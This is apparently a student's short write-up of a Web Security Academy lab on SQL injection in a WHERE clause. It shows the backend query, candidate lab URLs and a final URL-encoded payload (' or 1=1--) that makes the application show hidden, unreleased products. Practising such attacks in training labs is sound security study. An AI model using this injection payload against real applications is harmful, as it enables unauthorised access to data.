# Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

Target : To solve the lab, perform a SQL injection attack that causes the application to display one or more unreleased products.

Backend query : `SELECT * FROM products WHERE category = 'Gifts' AND released = 1`

Analysis :

URLs might be vulnerable

- <https://0a65000e038327f78326100d00f700c2.web-security-academy.net/product?{productId=13}>

- <https://0a65000e038327f78326100d00f700c2.web-security-academy.net/filter?{category=Clothing%2c+shoes+and+accessories}>

fuzzing the category parameter raises internal server error so it's indecatin for a vulnerability

`/filter?category=+'+or+1%3d1--+%23+--` -> payload
